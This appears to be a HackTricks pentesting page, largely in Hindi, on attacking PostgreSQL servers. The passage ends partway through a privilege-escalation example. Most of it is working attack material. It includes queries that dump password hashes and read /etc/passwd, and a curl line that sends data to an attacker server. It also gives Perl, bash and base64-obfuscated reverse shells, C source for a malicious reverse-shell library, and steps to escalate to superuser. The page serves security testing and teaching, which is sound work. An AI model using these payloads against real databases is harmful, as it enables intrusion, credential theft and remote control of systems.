# 5432,5433 - Pentesting Postgresql


{{#include ../banners/hacktricks-training.md}}

## **बुनियादी जानकारी**

**PostgreSQL** को एक **ऑब्जेक्ट-रिलेशनल डेटाबेस सिस्टम** के रूप में वर्णित किया गया है जो **ओपन सोर्स** है। यह सिस्टम न केवल SQL भाषा का उपयोग करता है बल्कि इसे अतिरिक्त सुविधाओं के साथ बढ़ाता है। इसकी क्षमताएँ इसे विभिन्न प्रकार के डेटा और संचालन को संभालने की अनुमति देती हैं, जिससे यह डेवलपर्स और संगठनों के लिए एक बहुपरकारी विकल्प बनता है।

**डिफ़ॉल्ट पोर्ट:** 5432, और यदि यह पोर्ट पहले से उपयोग में है तो ऐसा लगता है कि postgresql अगला पोर्ट (संभवतः 5433) का उपयोग करेगा जो उपयोग में नहीं है।
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## कनेक्ट और बेसिक एनम
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> यदि **`\list`** चलाते समय आपको **`rdsadmin`** नामक एक डेटाबेस मिलता है, तो आप जानते हैं कि आप एक **AWS postgresql database** के अंदर हैं।

**PostgreSQL डेटाबेस** का दुरुपयोग करने के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## स्वचालित गणना
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**ब्रूट फोर्स**](../generic-hacking/brute-force.md#postgresql)

### **पोर्ट स्कैनिंग**

According to [**this research**](https://www.exploit-db.com/papers/13084), जब एक कनेक्शन प्रयास विफल होता है, `dblink` एक `sqlclient_unable_to_establish_sqlconnection` अपवाद फेंकता है जिसमें त्रुटि का विवरण शामिल होता है। इन विवरणों के उदाहरण नीचे सूचीबद्ध हैं।
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- होस्ट डाउन है

`DETAIL: सर्वर से कनेक्ट नहीं हो सका: होस्ट के लिए कोई मार्ग नहीं है क्या सर्वर "1.2.3.4" पर चल रहा है और पोर्ट 5678 पर TCP/IP कनेक्शन स्वीकार कर रहा है?`

- पोर्ट बंद है
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- पोर्ट खुला है
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
या
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- पोर्ट खुला है या फ़िल्टर किया गया है
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL फ़ंक्शंस में, वर्तमान में अपवाद विवरण प्राप्त करना संभव नहीं है। हालाँकि, यदि आपके पास PostgreSQL सर्वर तक सीधी पहुँच है, तो आप आवश्यक जानकारी प्राप्त कर सकते हैं। यदि सिस्टम तालिकाओं से उपयोगकर्ता नाम और पासवर्ड निकालना संभव नहीं है, तो आप पिछले अनुभाग में चर्चा की गई शब्दसूची हमले की विधि का उपयोग करने पर विचार कर सकते हैं, क्योंकि यह सकारात्मक परिणाम दे सकता है।

## विशेषाधिकारों की गणना

### भूमिकाएँ

| भूमिका प्रकार     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | भूमिका के पास सुपरयूजर विशेषाधिकार हैं                                                                                                                        |
| rolinherit     | भूमिका अपने सदस्यों की भूमिकाओं के विशेषाधिकार स्वचालित रूप से विरासत में लेती है                                                                                    |
| rolcreaterole  | भूमिका अधिक भूमिकाएँ बना सकती है                                                                                                                           |
| rolcreatedb    | भूमिका डेटाबेस बना सकती है                                                                                                                            |
| rolcanlogin    | भूमिका लॉग इन कर सकती है। अर्थात, इस भूमिका को प्रारंभिक सत्र प्राधिकरण पहचानकर्ता के रूप में दिया जा सकता है                                                     |
| rolreplication | भूमिका एक पुनरुत्पादन भूमिका है। एक पुनरुत्पादन भूमिका पुनरुत्पादन कनेक्शन आरंभ कर सकती है और पुनरुत्पादन स्लॉट बना और हटा सकती है।                           |
| rolconnlimit   | उन भूमिकाओं के लिए जो लॉग इन कर सकती हैं, यह इस भूमिका द्वारा बनाए जा सकने वाले अधिकतम समवर्ती कनेक्शनों की संख्या निर्धारित करता है। -1 का अर्थ है कोई सीमा नहीं।                                 |
| rolpassword    | पासवर्ड नहीं (हमेशा `********` के रूप में पढ़ता है)                                                                                                        |
| rolvaliduntil  | पासवर्ड समाप्ति समय (केवल पासवर्ड प्रमाणीकरण के लिए उपयोग किया जाता है); यदि कोई समाप्ति नहीं है तो शून्य                                                                  |
| rolbypassrls   | भूमिका हर पंक्ति-स्तरीय सुरक्षा नीति को बायपास करती है, अधिक जानकारी के लिए [अनुभाग 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) देखें। |
| rolconfig      | रन-टाइम कॉन्फ़िगरेशन वेरिएबल के लिए भूमिका-विशिष्ट डिफ़ॉल्ट                                                                                          |
| oid            | भूमिका की आईडी                                                                                                                                           |

#### दिलचस्प समूह

- यदि आप **`pg_execute_server_program`** के सदस्य हैं तो आप **कार्यक्रमों को निष्पादित** कर सकते हैं
- यदि आप **`pg_read_server_files`** के सदस्य हैं तो आप **फाइलों को पढ़** सकते हैं
- यदि आप **`pg_write_server_files`** के सदस्य हैं तो आप **फाइलों को लिख** सकते हैं

> [!NOTE]
> ध्यान दें कि Postgres में एक **उपयोगकर्ता**, एक **समूह** और एक **भूमिका** **एक ही** है। यह केवल इस पर निर्भर करता है कि आप इसे **कैसे उपयोग करते हैं** और यदि आप इसे **लॉग इन करने की अनुमति देते हैं**।
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### तालिकाएँ
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### कार्य
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## फ़ाइल-प्रणाली क्रियाएँ

### निर्देशिकाएँ और फ़ाइलें पढ़ें

इस [**कमिट** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) से परिभाषित **`DEFAULT_ROLE_READ_SERVER_FILES`** समूह (जिसे **`pg_read_server_files`** कहा जाता है) और **सुपर उपयोगकर्ता** किसी भी पथ पर **`COPY`** विधि का उपयोग कर सकते हैं (देखें `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> याद रखें कि यदि आप सुपर यूजर नहीं हैं लेकिन आपके पास **CREATEROLE** अनुमतियाँ हैं, तो आप **अपने आप को उस समूह का सदस्य बना सकते हैं:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**अधिक जानकारी।**](pentesting-postgresql.md#privilege-escalation-with-createrole)

यहाँ **अन्य postgres फ़ंक्शन** हैं जिन्हें **फाइल पढ़ने या डायरेक्टरी सूचीबद्ध करने** के लिए उपयोग किया जा सकता है। केवल **सुपरयूजर्स** और **स्पष्ट अनुमतियों वाले उपयोगकर्ता** ही उनका उपयोग कर सकते हैं:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
आप **अधिक कार्य** [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) में पा सकते हैं

### सरल फ़ाइल लेखन

केवल **सुपर उपयोगकर्ता** और **`pg_write_server_files`** के सदस्य कॉपी का उपयोग करके फ़ाइलें लिख सकते हैं।
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> याद रखें कि यदि आप सुपर उपयोगकर्ता नहीं हैं लेकिन आपके पास **`CREATEROLE`** अनुमतियाँ हैं, तो आप **अपने आप को उस समूह का सदस्य बना सकते हैं:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**अधिक जानकारी।**](pentesting-postgresql.md#privilege-escalation-with-createrole)

याद रखें कि COPY नई लाइन वर्णों को संभाल नहीं सकता, इसलिए भले ही आप एक base64 पेलोड का उपयोग कर रहे हों, **आपको एक-लाइनर भेजने की आवश्यकता है।**\
इस तकनीक की एक बहुत महत्वपूर्ण सीमा यह है कि **`copy` बाइनरी फ़ाइलों को लिखने के लिए उपयोग नहीं किया जा सकता क्योंकि यह कुछ बाइनरी मानों को संशोधित करता है।**

### **बाइनरी फ़ाइलें अपलोड करना**

हालांकि, बड़ी बाइनरी फ़ाइलें अपलोड करने के लिए **अन्य तकनीकें हैं:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### स्थानीय फ़ाइल लेखन के माध्यम से PostgreSQL तालिका डेटा को अपडेट करना

यदि आपके पास PostgreSQL सर्वर फ़ाइलों को पढ़ने और लिखने के लिए आवश्यक अनुमतियाँ हैं, तो आप **सर्वर पर किसी भी तालिका को अपडेट कर सकते हैं** [PostgreSQL डेटा निर्देशिका](https://www.postgresql.org/docs/8.1/storage.html) में संबंधित फ़ाइल नोड को **ओवरराइट करके।** **इस तकनीक के बारे में अधिक** [**यहाँ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)।

आवश्यक चरण:

1.  PostgreSQL डेटा निर्देशिका प्राप्त करें

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**नोट:** यदि आप सेटिंग्स से वर्तमान डेटा निर्देशिका पथ प्राप्त करने में असमर्थ हैं, तो आप `SELECT version()` क्वेरी के माध्यम से प्रमुख PostgreSQL संस्करण को क्वेरी कर सकते हैं और पथ को ब्रूट-फोर्स करने का प्रयास कर सकते हैं। PostgreSQL के Unix इंस्टॉलेशन पर सामान्य डेटा निर्देशिका पथ हैं `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`। एक सामान्य क्लस्टर नाम `main` है।

2.  लक्षित तालिका से संबंधित फ़ाइलनोड के लिए सापेक्ष पथ प्राप्त करें

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

यह क्वेरी कुछ ऐसा लौटाना चाहिए जैसे `base/3/1337`। डिस्क पर पूरा पथ होगा `$DATA_DIRECTORY/base/3/1337`, यानी `/var/lib/postgresql/13/main/base/3/1337`।

3.  `lo_*` फ़ंक्शंस के माध्यम से फ़ाइलनोड डाउनलोड करें

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  लक्षित तालिका से संबंधित डेटा प्रकार प्राप्त करें

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  [PostgreSQL फ़ाइलनोड संपादक](https://github.com/adeadfed/postgresql-filenode-editor) का उपयोग करें [फ़ाइलनोड संपादित करने के लिए](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); सभी `rol*` बूलियन फ़्लैग को पूर्ण अनुमतियों के लिए 1 पर सेट करें।

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL फ़ाइलनोड संपादक डेमो](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  संपादित फ़ाइलनोड को `lo_*` फ़ंक्शंस के माध्यम से फिर से अपलोड करें, और डिस्क पर मूल फ़ाइल को ओवरराइट करें

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(वैकल्पिक)_ महंगा SQL क्वेरी चलाकर इन-मेमोरी तालिका कैश को साफ़ करें

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  अब आपको PostgreSQL में अपडेट की गई तालिका मान दिखाई देनी चाहिए।

आप `pg_authid` तालिका को संपादित करके सुपरadmin भी बन सकते हैं। **देखें** [**निम्नलिखित अनुभाग**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)।

## RCE

### **RCE प्रोग्राम के लिए**

चूंकि [संस्करण 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), केवल **सुपर उपयोगकर्ता** और **`pg_execute_server_program`** समूह के सदस्य RCE के लिए कॉपी का उपयोग कर सकते हैं (एक्सफिल्ट्रेशन के साथ उदाहरण:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
उदाहरण exec के लिए:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> याद रखें कि यदि आप सुपर उपयोगकर्ता नहीं हैं लेकिन आपके पास **`CREATEROLE`** अनुमतियाँ हैं, तो आप **उस समूह का सदस्य बना सकते हैं:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**अधिक जानकारी।**](pentesting-postgresql.md#privilege-escalation-with-createrole)

या **metasploit** से `multi/postgres/postgres_copy_from_program_cmd_exec` मॉड्यूल का उपयोग करें।\
इस भेद्यता के बारे में अधिक जानकारी [**यहां**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) है। जबकि इसे CVE-2019-9193 के रूप में रिपोर्ट किया गया था, Postges ने घोषणा की कि यह एक [विशेषता है और इसे ठीक नहीं किया जाएगा](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)।

### PostgreSQL भाषाओं के साथ RCE

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### PostgreSQL एक्सटेंशन के साथ RCE

एक बार जब आप **सीख चुके हैं** कि **बाइनरी फ़ाइलें कैसे अपलोड करें**, तो आप **एक पोस्टग्रेएसक्यूएल एक्सटेंशन अपलोड करके और इसे लोड करके RCE प्राप्त करने की कोशिश कर सकते हैं**।

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL कॉन्फ़िगरेशन फ़ाइल RCE

> [!NOTE]
> निम्नलिखित RCE वेक्टर विशेष रूप से सीमित SQLi संदर्भों में उपयोगी होते हैं, क्योंकि सभी चरणों को नेस्टेड SELECT स्टेटमेंट के माध्यम से किया जा सकता है

PostgreSQL की **कॉन्फ़िगरेशन फ़ाइल** **postgres उपयोगकर्ता** द्वारा **लिखी जा सकती है**, जो डेटाबेस चला रहा है, इसलिए **सुपरयूजर** के रूप में, आप फ़ाइलों को फ़ाइल सिस्टम में लिख सकते हैं, और इसलिए आप **इस फ़ाइल को ओवरराइट कर सकते हैं।**

![](<../images/image (322).png>)

#### **ssl_passphrase_command के साथ RCE**

इस तकनीक के बारे में अधिक जानकारी [यहां](https://pulsesecurity.co.nz/articles/postgres-sqli) है।

कॉन्फ़िगरेशन फ़ाइल में कुछ दिलचस्प विशेषताएँ हैं जो RCE की ओर ले जा सकती हैं:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` डेटाबेस की निजी कुंजी का पथ
- `ssl_passphrase_command = ''` यदि निजी फ़ाइल पासवर्ड (एन्क्रिप्टेड) द्वारा सुरक्षित है, तो पोस्टग्रेएसक्यूएल **इस विशेषता में निर्दिष्ट कमांड को निष्पादित करेगा**।
- `ssl_passphrase_command_supports_reload = off` **यदि** यह विशेषता **चालू** है, तो यदि कुंजी पासवर्ड द्वारा सुरक्षित है, तो **कमांड** `pg_reload_conf()` के **निष्पादन** पर **निष्पादित** किया जाएगा।

फिर, एक हमलावर को आवश्यकता होगी:

1. **सर्वर से निजी कुंजी डंप करें**
2. **डाउनलोड की गई निजी कुंजी को एन्क्रिप्ट करें:**
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **ओवरराइट करें**
4. वर्तमान पोस्टग्रेएसक्यूएल **कॉन्फ़िगरेशन** को **डंप करें**
5. उल्लेखित विशेषताओं की कॉन्फ़िगरेशन के साथ **कॉन्फ़िगरेशन** को **ओवरराइट करें:**
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` निष्पादित करें

जब मैंने इसका परीक्षण किया, तो मैंने देखा कि यह केवल तभी काम करेगा जब **निजी कुंजी फ़ाइल के पास 640 अनुमतियाँ हों**, यह **रूट** द्वारा **स्वामित्व** में हो और **समूह ssl-cert या postgres** द्वारा (ताकि postgres उपयोगकर्ता इसे पढ़ सके), और इसे _/var/lib/postgresql/12/main_ में रखा गया हो।

#### **archive_command के साथ RCE**

**इस कॉन्फ़िगरेशन और WAL के बारे में अधिक** [**जानकारी यहां**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**।**

कॉन्फ़िगरेशन फ़ाइल में एक और विशेषता जो शोषण योग्य है वह है `archive_command`।

इसके काम करने के लिए, `archive_mode` सेटिंग को `'on'` या `'always'` होना चाहिए। यदि यह सत्य है, तो हम `archive_command` में कमांड को ओवरराइट कर सकते हैं और इसे WAL (write-ahead logging) संचालन के माध्यम से निष्पादित करने के लिए मजबूर कर सकते हैं।

सामान्य चरण हैं:

1. जांचें कि क्या आर्काइव मोड सक्षम है: `SELECT current_setting('archive_mode')`
2. पेलोड के साथ `archive_command` को ओवरराइट करें। उदाहरण के लिए, एक रिवर्स शेल: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. कॉन्फ़िगरेशन को फिर से लोड करें: `SELECT pg_reload_conf()`
4. WAL संचालन को चलाने के लिए मजबूर करें, जो आर्काइव कमांड को कॉल करेगा: `SELECT pg_switch_wal()` या कुछ Postgres संस्करणों के लिए `SELECT pg_switch_xlog()`

#### **preload लाइब्रेरी के साथ RCE**

इस तकनीक के बारे में अधिक जानकारी [यहां](https://adeadfed.com/posts/postgresql-select-only-rce/) है।

यह हमला वे कॉन्फ़िगरेशन वेरिएबल का लाभ उठाता है:

- `session_preload_libraries` -- लाइब्रेरी जो PostgreSQL सर्वर द्वारा क्लाइंट कनेक्शन पर लोड की जाएंगी।
- `dynamic_library_path` -- निर्देशिकाओं की सूची जहां PostgreSQL सर्वर लाइब्रेरी के लिए खोज करेगा।

हम `dynamic_library_path` मान को एक निर्देशिका में सेट कर सकते हैं, जो डेटाबेस चला रहे `postgres` उपयोगकर्ता द्वारा लिखी जा सके, जैसे `/tmp/` निर्देशिका, और वहां एक दुर्भावनापूर्ण `.so` ऑब्जेक्ट अपलोड करें। अगला, हम PostgreSQL सर्वर को हमारे नए अपलोड किए गए लाइब्रेरी को लोड करने के लिए मजबूर करेंगे, इसे `session_preload_libraries` वेरिएबल में शामिल करके।

हमले के चरण हैं:

1. मूल `postgresql.conf` डाउनलोड करें
2. `dynamic_library_path` मान में `/tmp/` निर्देशिका शामिल करें, जैसे `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries` मान में दुर्भावनापूर्ण लाइब्रेरी का नाम शामिल करें, जैसे `session_preload_libraries = 'payload.so'`
4. `SELECT version()` क्वेरी के माध्यम से प्रमुख PostgreSQL संस्करण की जांच करें
5. सही PostgreSQL dev पैकेज के साथ दुर्भावनापूर्ण लाइब्रेरी कोड को संकलित करें। उदाहरण कोड:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

कोड संकलित करना:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. चरण 2-3 में बनाए गए दुर्भावनापूर्ण `postgresql.conf` को अपलोड करें और मूल को ओवरराइट करें
7. चरण 5 से `payload.so` को `/tmp` निर्देशिका में अपलोड करें
8. सर्वर कॉन्फ़िगरेशन को सर्वर को पुनरारंभ करके या `SELECT pg_reload_conf()` क्वेरी को लागू करके फिर से लोड करें
9. अगली DB कनेक्शन पर, आपको रिवर्स शेल कनेक्शन प्राप्त होगा।

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

[**दस्तावेज़ों**](https://www.postgresql.org/docs/13/sql-grant.html) के अनुसार: _**`CREATEROLE`** विशेषता वाले भूमिकाएँ किसी भी भूमिका में सदस्यता **दे या वापस ले** सकती हैं जो **सुपरयूजर** नहीं है।_

तो, यदि आपके पास **`CREATEROLE`** अनुमति है, तो आप अन्य **भूमिकाओं** (जो सुपरयूजर नहीं हैं) को अपनी पहुँच दे सकते हैं जो आपको फ़ाइलें पढ़ने और लिखने और कमांड निष्पादित करने का विकल्प दे सकती हैं:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modify Password

इस भूमिका वाले उपयोगकर्ता अन्य **गैर-सुपरयूज़र्स** के **पासवर्ड** को भी **बदल** सकते हैं:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

यह सामान्य है कि **स्थानीय उपयोगकर्ता PostgreSQL में बिना किसी पासवर्ड के लॉगिन कर सकते हैं**। इसलिए, एक बार जब आपने **कोड निष्पादित करने की अनुमति** प्राप्त कर ली, तो आप इन अनुमतियों का दुरुपयोग करके **`SUPERUSER`** भूमिका प्राप्त कर सकते हैं:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> यह आमतौर पर **`pg_hba.conf`** फ़ाइल में निम्नलिखित पंक्तियों के कारण संभव है:
>
> ```bash
> # "local" केवल Unix डोमेन सॉकेट कनेक्शनों के लिए है
> local   all             all                                     trust
> # IPv4 स्थानीय कनेक्शन:
> host    all             all             127.0.0.1/32            trust
> # IPv6 स्थानीय कनेक्शन:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

[**इस लेख**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) में बताया गया है कि कैसे **privesc** Postgres GCP में ALTER TABLE विशेषाधिकार का दुरुपयोग करके संभव हुआ जो उपयोगकर्ता को दिया गया था।

जब आप **किसी अन्य उपयोगकर्ता को एक तालिका का मालिक बनाने** की कोशिश करते हैं, तो आपको इसे रोकने के लिए एक **त्रुटि** प्राप्त होनी चाहिए, लेकिन स्पष्ट रूप से GCP ने GCP में **नॉन-सुपरयूजर postgres उपयोगकर्ता** को वह **विकल्प दिया**:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

इस विचार को इस तथ्य के साथ जोड़ते हुए कि जब **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) कमांड एक **सूचकांक फ़ंक्शन** वाली **तालिका** पर निष्पादित किए जाते हैं, तो **फ़ंक्शन** को **तालिका** **मालिक के अनुमतियों** के साथ कमांड के हिस्से के रूप में **कॉल** किया जाता है। यह एक फ़ंक्शन के साथ एक सूचकांक बनाने और उस तालिका पर एक **सुपर उपयोगकर्ता** को मालिक की अनुमतियाँ देने के लिए संभव है, और फिर उस तालिका पर ANALYZE चलाने के लिए जो दुर्भावनापूर्ण फ़ंक्शन का उपयोग करेगा जो मालिक के विशेषाधिकारों का उपयोग कर सकेगा।
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### शोषण

1. एक नई तालिका बनाने से शुरू करें।
2. तालिका में कुछ अप्रासंगिक सामग्री डालें ताकि अनुक्रमणिका फ़ंक्शन के लिए डेटा प्रदान किया जा सके।
3. एक दुर्भावनापूर्ण अनुक्रमणिका फ़ंक्शन विकसित करें जिसमें कोड निष्पादन पेलोड हो, जो अनधिकृत आदेशों को निष्पादित करने की अनुमति देता है।
4. तालिका के मालिक को "cloudsqladmin" में ALTER करें, जो GCP की सुपरयूजर भूमिका है जिसका उपयोग विशेष रूप से Cloud SQL द्वारा डेटाबेस का प्रबंधन और रखरखाव करने के लिए किया जाता है।
5. तालिका पर एक ANALYZE ऑपरेशन करें। यह क्रिया PostgreSQL इंजन को तालिका के मालिक "cloudsqladmin" के उपयोगकर्ता संदर्भ में स्विच करने के लिए मजबूर करती है। परिणामस्वरूप, दुर्भावनापूर्ण अनुक्रमणिका फ़ंक्शन "cloudsqladmin" की अनुमतियों के साथ कॉल किया जाता है, जिससे पहले से अनधिकृत शेल आदेश के निष्पादन की अनुमति मिलती है।

PostgreSQL में, यह प्रवाह कुछ इस तरह दिखता है:
```sql
CREATE TABLE temp_table (data text);
